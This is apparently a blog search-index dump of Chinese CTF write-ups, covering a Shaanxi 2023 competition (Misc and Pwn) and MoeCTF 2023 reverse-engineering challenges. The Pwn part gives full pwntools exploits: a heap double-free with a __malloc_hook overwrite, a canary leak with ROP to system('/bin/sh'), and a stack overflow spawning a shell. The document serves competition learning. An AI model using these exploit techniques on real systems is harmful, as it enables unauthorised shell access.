flag{w0w!_PE_sT3uctU3e_1$_suBt1e}","date":"2024-05-05","objectID":"/posts/edebc43/:2:2","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.3 Misc\r2.3.1 云璎谐音，云影密码 def de_code(c): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] flag = [] c2 = [i for i in c.split(\"0\")] for i in c2: c3 = 0 for j in i: c3 += int(j) flag.append(dic[c3 - 1]) return flag def encode(plaintext): dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)] m = [i for i in plaintext] tmp = []; flag = [] for i in range(len(m)): for j in range(len(dic)): if m[i] == dic[j]: tmp.append(j + 1) for i in tmp: res = \"\" if i \u003e= 8: res += int(i / 8) * \"8\" if i % 8 \u003e= 4: res += int(i % 8 / 4) * \"4\" if i % 4 \u003e= 2: res += int(i % 4 / 2) * \"2\" if i % 2 \u003e= 1: res += int(i % 2 / 1) * \"1\" flag.append(res + \"0\") print(\"\".join(flag)[:-1]) c = input(\"输入要解密的数字串:\") print(de_code(c)) m_code = input(\"请输入要加密的数字串:\") encode(m_code) md5 加密后得到 flag flag{9edabf1448871181eb0e7133b5b3d701}","date":"2024-05-05","objectID":"/posts/edebc43/:2:3","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r2.4 Pwn\r2.4.1 勇闯迷宫-过三关from pwn import * e=ELF(\"./pwn\") context.binary=e libc=ELF(\"./libc-2.23.so\") import sys if len(sys.argv)==1: p=process(\"./pwn\") gdb.attach(p) pause() else: p=remote(sys.argv[1],sys.argv[2]) context.log_level='debug' p.sendlineafter(\":\\n\",'516') p.sendlineafter('\u003e\u003e ','1') p.sendlineafter('\u003e\u003e ','4') p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('\u003e\u003e ','3') p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('\u003e\u003e ',str(133)) p.sendline(str(0x4014b4)) p1=\"I_LOVE$$CTF_IN5.16 R0OT\" p2=\"I_LOVE$$APPLES65.16 R0OT\" n=1 def check(): global n p.sendlineafter('\u003e',p2) p.sendlineafter('\u003e',p2) p.sendlineafter('hahahha,','0') def add(ind,size,data=' '): p.sendlineafter('\u003e:','1') p.sendlineafter('Index: ',str(ind)) p.sendlineafter('Size: ',str(size)) p.sendlineafter('Content: ',data) pass def free(ind): p.sendlineafter('\u003e:','3') p.sendlineafter('Index: ',str(ind)) pass def show(ind): p.sendlineafter('\u003e:','2') p.sendlineafter('Index: ',str(ind)) pass check() add(0,0xf0) add(1,0x68) add(2,0x68) add(3,0x68) free(0) show(0) d=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00')) print(hex(d)) libc.address=d-libc.sym['__malloc_hook']-0x58-0x10 print(hex(libc.address)) free_hook=libc.sym['__free_hook']-0x14 system=libc.sym['system'] malloc_hook=libc.sym['__malloc_hook']-0x23 gadget=libc.address+0xf1247 free(2) free(1) free(2) add(4,0x68,p64(malloc_hook)) add(5,0x68,b'/bin/sh\\x00') add(6,0x68) add(7,0x68,b'a'*0x13+p64(gadget)) p.sendlineafter('\u003e:','1') p.sendlineafter('Index: ','9') p.sendlineafter('Size: ','12') p.interactive()\r2.4.2 canaryfrom pwn import * import sys from ctypes import * dll=CDLL(\"./libc\") e=ELF(\"./pwn\") libc=ELF(\"./libc.so.6\") p=remote(sys.argv[1],sys.argv[2]) p.sendlineafter('select:','1') p.readuntil(\"Go:\\n\") dll.srand(dll.time(0)) n=dll.rand()%100+1 p.sendline(str(n)) context.log_level='debug' p.read(0x28) can=u64(p.read(8)) print(hex(can)) p.read(0x10+0x10+0x8) libc_start_main=u64(p.read(8)) print(hex(libc_start_main)) libc.address=libc_start_main-0x29d90 print(hex(libc.address)) rdi=0x0000000000400b93 bin_sh=next(libc.search(b'/bin/sh\\x00')) system=libc.sym['system'] ret=0x000000000040073e p.sendline(b'a'*0x28+p64(can)+b'b'*8+p64(rdi)+p64(bin_sh)+p64(ret)+p64(system)) p.interactive()\r2.4.3 stackfrom pwn import * import sys p=remote(sys.argv[1],sys.argv[2]) p.sendlineafter('name?','a') p.sendlineafter('you?',b'a'*0x90+b'b'*8+p64(0x40082e)) p.interactive()","date":"2024-05-05","objectID":"/posts/edebc43/:2:4","tags":["比赛","WP"],"title":"2023年第三届陕西省大学生网络安全技能大赛WP","uri":"/posts/edebc43/"},{"categories":["WP"],"content":"\r1 Reverse入门指北 INTRO_RE.exe 使用 ida 打开，调用 F12 查看字符串即可 moectf{F1rst_St3p_1s_D0ne}","date":"2024-05-05","objectID":"/posts/54f90da/:1:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r2 base_64 base64.pyc 考的是 python 的逆向，需要将 .pyc 文件进行反编译 使用工具 uncompyle6 将 .pyc 文件反编译为 py 文件即可 uncompyle6 -o base_64.py base_64.pyc得到原始代码 import base64 from string import * str1 = 'yD9oB3Inv3YAB19YynIuJnUaAGB0um0=' string1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/' string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' flag = input('welcome to moectf\\ninput your flag and I wiil check it:') enc_flag = base64.b64encode(flag.encode()).decode() enc_flag = enc_flag.translate(str.maketrans(string2, string1)) if enc_flag == str1: print('good job!!!!') else: print('something wrong???') exit(0)很明显的 base64 换表，核心是 maketrans 函数，需要讲原表 string2 和 新表 string1 进行替换，长度一样即可 moectf{pYc_And_Base64~}","date":"2024-05-05","objectID":"/posts/54f90da/:2:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r3 UPX! UPX!.exe 根据题目名也可以知道这个程序经过 upx 加壳，使用 upx 脱壳即可 upx -d \"UPX!.exe\"脱壳后使用 ida 打开，找到核心的代码 __int64 sub_140079760() { char *v0; // rdi __int64 i; // rcx unsigned __int64 v2; // rax char v4[32]; // [rsp+0h] [rbp-20h] BYREF char v5; // [rsp+20h] [rbp+0h] BYREF char v6[76]; // [rsp+28h] [rbp+8h] BYREF int j; // [rsp+74h] [rbp+54h] unsigned __int64 v8; // [rsp+148h] [rbp+128h] v0 = \u0026v5; for ( i = 34i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_140075557(\u0026unk_1401A7008); sub_140073581(\"welcome to moectf\"); sub_140073581(\"I put a shell on my program to prevent you from reversing it, you will never be able to reverse it hhhh~~\"); sub_140073581(\"Now tell me your flag:\"); memset(v6, 0, 0x2Aui64); sub_1400727F8(\"%s\", v6); for ( j = 0; ; ++j ) { v8 = j; v2 = sub_140073829(v6); if ( v8 \u003e= v2 ) break; v6[j] ^= 0x67u; if ( byte_140196000[j] != v6[j] ) { sub_140073973(\"try again~~\"); sub_1400723F7(0i64); } } sub_140073973(\"you are so clever!\"); sub_140074BCF(v4, \u0026unk_140162070); return 0i64; }已加密的变量在 byte_140196000，且将每个明文的值去异或上 0x67 ,最后与密文比较，就是加密过程 解密脚本如下 flag = \"0A 08 02 04 13 01 1C 57 0F 38 1E 57 12 38 2C 09 57 10 38 2F 57 10 38 13 08 38 35 02 11 54 15 14 02 38 32 37 3F 46 46 46 1A\".split(\" \") for i in flag: print(chr(int(i,16) ^ 0x67),end='')运行即可得到 flag moectf{0h_y0u_Kn0w_H0w_to_Rev3rse_UPX!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:3:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r4 Xor XOR.exe ida 打开后的入口反编译就是题目代码 __int64 __fastcall main() { int i; // [rsp+2Ch] [rbp-34h] unsigned __int8 input[29]; // [rsp+30h] [rbp-30h] BYREF int v3; // [rsp+5Ch] [rbp-4h] _main(); v3 = 0; memset(input, 0, sizeof(input)); printf(\"Please input the flag:\\n\"); gets(input); for ( i = 0; i \u003c 28; ++i ) { if ( enc[i] != (input[i] ^ 0x39) ) { puts(\"Seems not right\"); exit(0); } } puts(\"GOOD!\"); return 0i64; }上面程序中，可以得知，密文为 enc，且将输入的明文一一异或 0x39 并和对应下标密文对比，解密手段可以参照上一题 flag = \"54 56 5C 5A 4D 5F 42 60 56 4C 66 52 57 09 4E 66 51 09 4E 66 4D 09 66 61 09 6B 18 44\".split(\" \") for i in flag: print(chr(int(i,16) ^ 0x39),end='')运行后即可得到 flag moectf{You_kn0w_h0w_t0_X0R!}","date":"2024-05-05","objectID":"/posts/54f90da/:4:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r5 ANDROID BasicAndroid.apk 使用 jadx 工具对其进行反编译 具体的代码在 com.doctor3.basicandroid4 的 MainActivity 函数体中 public class MainActivity extends AppCompatActivity { char[] enc = {25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16}; char[] key = {'t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y'}; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); final EditText editText = (EditText) findViewById(R.id.input); ((Button) findViewById(R.id.check)).setOnClickListener(new View.OnClickListener() { // from class: com.doctor3.basicandroid.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { String obj = editText.getText().toString(); if (obj.length() != 31) { Toast.makeText(MainActivity.this.getApplicationContext(), \"长度不对哦\", 0).show(); return; } byte[] bytes = obj.getBytes(); for (int i = 0; i \u003c 31; i++) { if ((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i]) { Toast.makeText(MainActivity.this.getApplicationContext(), \"好像有哪里不对\", 0).show(); return; } } Toast.makeText(MainActivity.this.getApplicationContext(), \"恭喜！回答正确\", 0).show(); } }); } }可以得到以下信息 密文为 enc 变量 key 变量是异或的值 输入的明文与 key 进行异或后，和密文 enc 对应的下标进行对比 这里可以将 key 理解为 repeat 成长度为 31 的新 key,或每次越界后从头开始，取余即可，以下是解密脚本 flag = [25, 7, 0, 14, 27, 3, 16, '/', 24, 2, '\\t', ':', 4, 1, ':', '*', 11, 29, 6, 7, '\\f', '\\t', '0', 'T', 24, ':', 28, 21, 27, 28, 16] key = ['t', 'h', 'e', 'm', 'o', 'e', 'k', 'e', 'y'] for i,v in enumerate(flag): if type(v) != int: v = ord(v); print(chr(v ^ (ord(key[i % len(key)]))),end='')直接运行即可 moectf{Java_in_Android_1s_easy}","date":"2024-05-05","objectID":"/posts/54f90da/:5:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r6 RRRRRc4 RRRRRc4.exe 看题目名称，应该可以知道考的是 RC4 算法 __int64 sub_140079A70() { char *v0; // rdi __int64 i; // rcx char v3[32]; // [rsp+0h] [rbp-30h] BYREF char v4; // [rsp+30h] [rbp+0h] BYREF char v5[256]; // [rsp+40h] [rbp+10h] BYREF char v6[256]; // [rsp+160h] [rbp+130h] BYREF char v7[44]; // [rsp+278h] [rbp+248h] BYREF int v8; // [rsp+2A4h] [rbp+274h] int j; // [rsp+2C4h] [rbp+294h] v0 = \u0026v4; for ( i = 172i64; i; --i ) { *(_DWORD *)v0 = -858993460; v0 += 4; } sub_14007555C(\u0026unk_1401A7007); memset(v5, 0, sizeof(v5)); memset(v6, 0, sizeof(v6)); strcpy(v7, \"moectf2023\"); v8 = 0; sub_140073581(\"welcome to moectf!!!\"); sub_140073581(\"This is a very common algorithm \"); sub_140073581(\"show your flag:\"); sub_1400727F8(\"%s\", byte_140197260); if ( sub_140073829(byte_140197260) == 37 ) { sub_140075052((unsigned int)v5, (unsigned int)v6, (unsigned int)byte_140197260, 38, (__int64)v7, 10); for ( j = 0; (unsigned __int64)j \u003c 0x26; ++j ) { if ( byte_140196000[j] == (unsigned __int8)byte_140197260[j] ) ++v8; } } if ( v8 == 37 ) sub_140073973(\"right!flag is your input!\"); else sub_140073973(\"try again~\"); sub_140074BCF(v3, \u0026unk_140162100); return 0i64; }这里只是外部，用来对比校验结果是否符合的，先将密文提取，在变量 byte_140196000 中 密文如下: 1B 9B FB 19 06 6A B5 3B 7C BA 03 F3 91 B8 B6 3D 8A C1 48 2E 50 11 E7 C7 4F B1 27 CF F3 AE 03 09 B2 08 FB DC 22分析下，加密的函数应该是这段 sub_140075052((unsigned int)v5, (unsigned int)v6, (unsigned int)byte_140197260, 38, (__int64)v7, 10);进去看函数的具体实现如下 __int64 __fastcall sub_1400795E0(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 a5, unsigned int a6) { __int64 result; // rax int i; // [rsp+24h] [rbp+4h] int j; // [rsp+24h] [rbp+4h] int v9; // [rsp+24h] [rbp+4h] int v10; // [rsp+44h] [rbp+24h] int v11; // [rsp+44h] [rbp+24h] char v12; // [rsp+64h] [rbp+44h] char v13; // [rsp+64h] [rbp+44h] int v14; // [rsp+A4h] [rbp+84h] result = sub_14007555C(\u0026unk_1401A7007); v10 = 0; v14 = 0; for ( i = 0; i \u003c 256; ++i ) { *(_BYTE *)(a1 + i) = i; *(_BYTE *)(a2 + i) = *(_BYTE *)(a5 + i % a6); result = (unsigned int)(i + 1); } for ( j = 0; j \u003c 256; ++j ) { v10 = (*(unsigned __int8 *)(a2 + j) + *(unsigned __int8 *)(a1 + j) + v10) % 256; v12 = *(_BYTE *)(a1 + v10); *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j); *(_BYTE *)(a1 + j) = v12; result = (unsigned int)(j + 1); } v9 = 0; v11 = 0; while ( a4 ) { v9 = (v9 + 1) % 256; v11 = (*(unsigned __int8 *)(a1 + v9) + v11) % 256; v13 = *(_BYTE *)(a1 + v11); *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9); *(_BYTE *)(a1 + v9) = v13; *(_BYTE *)(a3 + v14++) ^= *(_BYTE *)(a1 + (*(unsigned __int8 *)(a1 + v11) + *(unsigned __int8 *)(a1 + v9)) % 256); result = (unsigned int)--a4; } return result; }确实是 RC4 的实现，那么解密就很快了，由于该加密是对称加密，所以密文同时也是密文，现在，还需要一个 key 在第一段函数体中，可以看到加密函数传参了 6 个参数，其中 v7 是 key ，也就是 moectf2023 解密得到 flag moectf{y0u_r3a11y_understand_rc4!!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:6:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r7 SMC SMC.exe 核心的内容如下 int __cdecl main_0(int argc, const char **argv, const char **envp) { char v4; // [esp+0h] [ebp-78h] char v5; // [esp+0h] [ebp-78h] char v6[104]; // [esp+Ch] [ebp-6Ch] BYREF sub_401087(aPlzInputYourFl, v4); sub_401023(aS, (char)v6); sub_4011E0(); if ( sub_401050(v6) ) sub_401087(aGood, v5); else sub_401087(aTryAgainPlease, v5); return 0; }可知，当满足 sub_401050(v6) 后，即可，但是却无法分析 sub_401050 函数的具体实现 // attributes: thunk void __cdecl sub_401050(int a1) { JUMPOUT(0x4014D0); }转到反汇编处，看到跳转到了另一个函数处 jmp loc_4014D0跟进后可以看到 loc_4014D0 这个函数的汇编，都是一些赋值操作，但是在最后，有一段数据区 在交叉引用处，发现另外一个函数中，也有此函数出现 int sub_401550() { int result; // eax int i; // [esp+4h] [ebp-1Ch] DWORD flOldProtect[2]; // [esp+18h] [ebp-8h] BYREF flOldProtect[1] = -858993460; flOldProtect[0] = (DWORD)malloc(8u); result = VirtualProtect((char *)\u0026loc_4014D0 - (unsigned int)\u0026loc_4014D0 % 0x1000, 0x1000u, 0x80u, flOldProtect); for ( i = 0; i \u003c 122; ++i ) { *((_BYTE *)\u0026loc_4014D0 + i) ^= 0x66u; result = i + 1; } return result; }这里将 loc_4014D0 开始的值逐一进行异或，交叉引用后发现，该函数体被入口处的 main 函数体中的 sub_4011E0 方法调用 在调用该函数后，调用了 sub_401050(v6),所以基本可以确定这个程序在运行时，修改了自身，即 SMC 解释如下 SMC，即Self Modifying Code，动态代码加密技术，指通过修改代码或数据，阻止别人直接静态分析，然后在动态运行程序时对代码进行解密，达到程序正常运行的效果。 而计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。 通常来说，SMC使用汇编去写会比较好，因为它涉及更改机器码，但SMC也可以直接通过C、C++来实现。 看到这，差不多就明白了，需要进行动态调试拿到解析后的代码才能分析，那么现在有两种选择 动态调试，得到修改后的代码再进行分析 分析程序，自己写代码，手动修改，得到代码 7.0.1 方法一先说第一种方法，动态调试，这里选择使用 dbg 进行动态调试，设置函数调用前的断点，并用插件 Scylla 的功能保存当前状态的程序，得到真实的代码 得到保存后的二进制文件 SMC_dump.exe 后，再使用 ida 重新进行分析，就能看到 sub_401050 函数的真实代码了 int __cdecl sub_4014D0(char *Str) { size_t i; // [esp+0h] [ebp-8h] int v3; // [esp+4h] [ebp-4h] v3 = 1; for ( i = 0; i \u003c strlen(Str); ++i ) { if ( ((unsigned __int8)(Str[i] + 57) ^ 0x39) != (unsigned __int8)byte_40A000[i] ) v3 = 0; } return v3; }这段程序中，输入的值先加上 57 再 异或 0x39 ，并于密文变量 byte_40A000 一一比较，所以，提取该变量的值，并逆向即可 7.0.2 方法二第二种方法就是找到程序运行中，修改自身的代码，并复刻修改地址的代码， 手动编写代码运行来修改，从而得到修改后的代码。 上面说了，在函数 sub_401550() 中，就是目标的修改代码，所以我们可以复制他的方法，编写 idc 来手动模拟程序运行到这个方法。 下面是编写的 idc 代码，运行即可 static main(){ auto address = 0x4014d0; auto i; for(i=0;i\u003c122;i++){ PatchByte(address+i,Byte(address+i) ^ 0x66); } Message(\"patch ok\"); }运行代码后，整个程序变为 将多余出来，没有识别的数据，识别为汇编即可，然后创建函数，即可反编译，得到解密后的真实代码 int __cdecl sub_4014D0(char *Str) { size_t i; // [esp+0h] [ebp-8h] int v3; // [esp+4h] [ebp-4h] v3 = 1; for ( i = 0; i \u003c strlen(Str); ++i ) { if ( ((unsigned __int8)(Str[i] + 57) ^ 0x39) != (unsigned __int8)byte_40A000[i] ) v3 = 0; } return v3; }最后解密程序如下 flag = \"9F 91 A7 A5 94 A6 8D B5 A7 9C A6 A1 BF 91 A4 53 A6 53 A5 A3 94 9B 91 9E 8F\".split(\" \") for i in flag: print(chr((int(i,16) ^ 0x39) - 57),end='')Flag 如下 moectf{Self_Mod1f1cation}","date":"2024-05-05","objectID":"/posts/54f90da/:7:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r8 EQUATION EQUATION.exe 用 ida 分析，发现一段很长的多个 if 判断条件，且是运算公式，应该是考察 z3 库的使用，直接贴代码了 from z3 import * ques = open('question.txt','r').read().replace(' ','').replace('\\n','').replace('!=','==').replace('\u003c\u003c','*2**').split('||') for i in range(31): exec( f\"v4_{i} = Int('v4_{i}')\" ) for j in range(0,len(ques)): ques[j] = ques[j].replace( f\"v4[{i}]\", f\"v4_{i}\" ) s = Solver() for i in ques: exec( f\"s.add({i})\" ) if s.check(): model = s.model() for i in range(31): print( chr( int( str( s.model().eval(eval(f\"v4_{i}\")) ) ) ), end=\"\" )其中 question.txt 的内容如下 334 * v4[28] + 100 * v4[27] + 369 * v4[26] + 124 * v4[25] + 278 * v4[24] + 158 * v4[23] + 162 * v4[22] + 145 * v4[19] + 27 * v4[17] + 91 * v4[15] + 195 * v4[14] + 342 * v4[13] + 391 * v4[10] + 204 * v4[9] + 302 * v4[8] + 153 * v4[7] + 292 * v4[6] + 382 * v4[5] + 221 * v4[4] + 316 * v4[3] + 118 * v4[2] + 295 * v4[1] + 247 * v4[0] + 236 * v4[11] + 27 * v4[12] + 361 * v4[16] + 81 * v4[18] + 105 * v4[20] + 65 * v4[21] + 67 * v4[29] + 41 * v4[30] != 596119 || 371 * v4[29] + 338 * v4[28] + 269 * v4[27] + 312 * v4[26] + 67 * v4[25] + 299 * v4[24] + 235 * v4[23] + 294 * v4[22] + 303 * v4[21] + 211 * v4[20] + 122 * v4[19] + 333 * v4[18] + 341 * v4[15] + 111 * v4[14] + 253 * v4[13] + 68 * v4[12] + 347 * v4[11] + 44 * v4[10] + 262 * v4[9] + 357 * v4[8] + 323 * v4[5] + 141 * v4[4] + 329 * v4[3] + 378 * v4[2] + 316 * v4[1] + 235 * v4[0] + 59 * v4[6] + 37 * v4[7] + 264 * v4[16] + 73 * v4[17] + 126 * v4[30] != 634009 || 337 * v4[29] + 338 * v4[28] + 118 * v4[27] + 82 * v4[26] + 239 * v4[21] + 58 * v4[20] + 304 * v4[19] + 330 * v4[18] + 377 * v4[17] + 306 * v4[16] + 221 * v4[13] + 345 * v4[12] + 124 * v4[11] + 272 * v4[10] + 270 * v4[9] + 229 * v4[8] + 377 * v4[7] + 373 * v4[6] + 297 * v4[5] + 112 * v4[4] + 386 * v4[3] + 90 * v4[2] + 361 * v4[1] + 236 * v4[0] + 386 * v4[14] + 73 * v4[15] + 315 * v4[22] + 33 * v4[23] + 141 * v4[24] + 129 * v4[25] + 123 * v4[30] != 685705 || 367 * v4[29] + 55 * v4[28] + 374 * v4[27] + 150 * v4[24] + 350 * v4[23] + 141 * v4[22] + 124 * v4[21] + 366 * v4[20] + 230 * v4[19] + 307 * v4[18] + 191 * v4[17] + 153 * v4[12] + 383 * v4[11] + 145 * v4[10] + 109 * v4[9] + 209 * v4[8] + 158 * v4[7] + 221 * v4[6] + 188 * v4[5] + 22 * v4[4] + 146 * v4[3] + 306 * v4[2] + 230 * v4[1] + 13 * v4[0] + 287 * v4[13] + 257 * v4[14] + 137 * v4[15] + 7 * v4[16] + 52 * v4[25] + 31 * v4[26] + 355 * v4[30] != 557696 || 100 * v4[29] + 191 * v4[28] + 362 * v4[27] + 55 * v4[26] + 210 * v4[25] + 359 * v4[24] + 348 * v4[21] + 83 * v4[20] + 395 * v4[19] + 350 * v4[16] + 291 * v4[15] + 220 * v4[12] + 196 * v4[11] + 399 * v4[8] + 68 * v4[7] + 84 * v4[6] + 281 * v4[5] + 334 * v4[4] + 53 * v4[3] + 399 * v4[2] + 338 * v4[0] + 18 * v4[1] + 148 * v4[9] + 21 * v4[10] + 174 * v4[13] + 36 * v4[14] + 2 * v4[17] + 41 * v4[18] + 137 * v4[22] + 24 * v4[23] + 368 * v4[30] != 538535 || 188 * v4[29] + (v4[26] \u003c\u003c 7) + 93 * v4[25] + 248 * v4[24] + 83 * v4[23] + 207 * v4[22] + 217 * v4[19] + 309 * v4[16] + 16 * v4[15] + 135 * v4[14] + 251 * v4[13] + 200 * v4[12] + 49 * v4[11] + 119 * v4[10] + 356 * v4[9] + 398 * v4[8] + 303 * v4[7] + 224 * v4[6] + 208 * v4[5] + 244 * v4[4] + 209 * v4[3] + 189 * v4[2] + 302 * v4[1] + 395 * v4[0] + 314 * v4[17] + 13 * v4[18] + 310 * v4[20] + 21 * v4[21] + 67 * v4[27] + 127 * v4[28] + 100 * v4[30] != 580384 || 293 * v4[29] + 343 * v4[28] + 123 * v4[27] + 387 * v4[26] + 114 * v4[25] + 303 * v4[24] + 248 * v4[23] + 258 * v4[21] + 218 * v4[20] + 180 * v4[19] + 196 * v4[18] + 398 * v4[17] + 398 * v4[14] + 138 * v4[9] + 292 * v4[8] + 38 * v4[7] + 179 * v4[6] + 190 * v4[5] + 57 * v4[4] + 358 * v4[3] + 191 * v4[2] + 215 * v4[1] + 88 * v4[0] + 22 * v4[10] + 72 * v4[11] + 357 * v4[12] + 9 * v4[13] + 389 * v4[15] + 81 * v4[16] + 85 * v4[30] != 529847 || 311 * v4[29] + 202 * v4[28] + 234 * v4[27] + 272 * v4[26] + 55 * v4[25] + 328 * v4[24] + 246 * v4[23] + 362 * v4[22] + 86 * v4[21] + 75 * v4[20] + 142 * v4[17] + 244 * v4[16] + 216 * v4[15] + 281 * v4[14] + 398 * v4[13] + 322 * v4[12] + 251 * v4[11] + 357 *","date":"2024-05-05","objectID":"/posts/54f90da/:8:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r9 junk_code junk_code.exe 这道题考的是花指令混淆的对抗，程序的主要代码如下 int __cdecl main_0(int argc, const char **argv, const char **envp) { char Str[18]; // [esp+E8h] [ebp-30h] BYREF _BYTE v5[26]; // [esp+FAh] [ebp-1Eh] BYREF __CheckForDebuggerJustMyCode(\u0026unk_543007); j__puts(\"welcome to moectf\\nyour flag:\"); v5[18] = 0; sub_4591AE(\"%36s\", Str); if ( j__strlen(Str) \u003e\u003e 1 == 18 ) { if ( sub_45A9A0(Str, 18) \u0026\u0026 sub_459EBF(v5, 18) ) j__puts(\"congratulations!!!\"); else j__puts(\"WORNG!\"); return 0; } else { j__puts(\"WORNG!\"); return 0; } }分析后可得知，函数 sub_45A9A0 和函数 sub_459EBF 是判断对错的关键，所以猜测 flag 长度是 18*2=36 ，通过两个函数中的运算得到各自的一半 进入函数发现无法编译，应该就是在这对抗花指令 看汇编发现，最后的 jz 跳转是无效的，而 loc_460612 函数处的内容，也是无效的，所以取消定义U ，并将内容改为 nop ,最后回到原函数 sub_45A9A0 处，重新识别为函数即可正常编译 得到伪代码 int __cdecl sub_4605D0(char *a1, int a2) { char v3; // [esp+D3h] [ebp-3Dh] int i; // [esp+DCh] [ebp-34h] int j; // [esp+DCh] [ebp-34h] int k; // [esp+DCh] [ebp-34h] int v7[4]; // [esp+F4h] [ebp-1Ch] BYREF __int16 v8; // [esp+104h] [ebp-Ch] memset(v7, 0, sizeof(v7)); v8 = 0; for ( i = 0; i \u003c a2; ++i ) { v3 = *a1++; *((_BYTE *)v7 + i) = v3; } for ( j = 0; j \u003c a2; ++j ) *((_BYTE *)v7 + j) -= 5; for ( k = 0; k \u003c a2; ++k ) { if ( aHjOavtPzmHQ[k] != *((_BYTE *)v7 + k) ) return 0; } return 1; }而第二个函数 sub_459EBF 的操作过程同理，最后得到如下伪代码 BOOL __cdecl sub_460750(char *Str2, signed int MaxCount) { signed int i; // [esp+D4h] [ebp-8h] for ( i = 0; i \u003c MaxCount; ++i ) Str2[i] ^= 0x66u; return j__strncmp(Str1, Str2, MaxCount) == 0; }分析后，最后的解密代码如下 enc1 = \"hj`^oavt+pZm`h+q._\" enc2 = \"39 12 0E 55 39 0C 13 08 0D 39 05 56 02 55 47 47 47 1B\".split(\" \") for i in enc1: print(chr(ord(i) + 5),end=''); for i in enc2: print(chr(int(i,16) ^ 0x66),end='');运行后即可得到 flag moectf{y0u_rem0v3d_th3_junk_c0d3!!!}","date":"2024-05-05","objectID":"/posts/54f90da/:9:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":["WP"],"content":"\r10 ezandroid ezandroid.apk 使用 jadx 工具反编译 apk ，在 com.doctor3.ezandroid 中的 MainActivity 方法，内有一个外部库的引入 public native int check(String str); static { System.loadLibrary(\"ezandroid\"); }同时还申明了 navtive 函数 check 主要代码如下 btn.setOnClickListener(new View.OnClickListener() { // from class: com.doctor3.ezandroid.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { String s = input.getText().toString(); if (s.length() != 23) { Toast.makeText(MainActivity.this.getApplicationContext(), \"长度不对哦\", 0).show(); } else if (MainActivity.this.check(s) == 1) { Context applicationContext = MainActivity.this.getApplicationContext(); Toast.makeText(applicationContext, \"OK!RIGHT,flag is moectf{\" + s + \"}\", 0).show(); } else { Toast.makeText(MainActivity.this.getApplicationContext(), \"Try to reverse the native lib!\", 0).show(); } } });可以看到大致逻辑，调用了 check 函数来判断 flag 是否正确，这个时候就要去看 ezandroid 这个引入的库是什么内容 使用 ida 分析 apk 中的 libezandroid.so 文件，发现有个 JNI_OnLoad 函数，应该就是注册 native 的入口，所以应该是动态注册，且规定了一串文本 ******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......*********************** 且另外有个函数也调用了这串文本，代码如下 _BOOL8 __fastcall sub_E80(_BYTE *a1) { _BYTE *v1; // rax bool v3; // [rsp+Fh] [rbp-19h] char *v4; // [rsp+10h] [rbp-18h] _BOOL4 v6; // [rsp+24h] [rbp-4h] v4 = \u0026asc_3C30[18]; while ( 2 ) { v3 = 0; if ( *a1 ) v3 = *v4 != 42; if ( v3 ) { v1 = a1++; switch ( *v1 ) { case 'a': --v4; continue; case 'd': ++v4; continue; case 's': v4 += 15; continue; case 'w': v4 -= 15; continue; default: v6 = 0; break; } } else { v6 = *v4 == 35; } break; } return v6; }看到有 adsw 这些，并且上下是位移 15,左右是 1 ，可以猜测是迷宫题了，且是个 9*15 的迷宫 整理输出后的迷宫如下 *************** ***@*********** ***.*********** *...****#..**** *.********.**** *.****.....**** *.****.******** *......******** ***************走到 # 即可 moectf{ssaassssdddddwwwddddwwwa}","date":"2024-05-05","objectID":"/posts/54f90da/:10:0","tags":["Reverse","WP"],"title":"2023MoeCTF Reverse WP","uri":"/posts/54f90da/"},{"categories":null,"content":"\r信息\remail: C4skg@qq.com 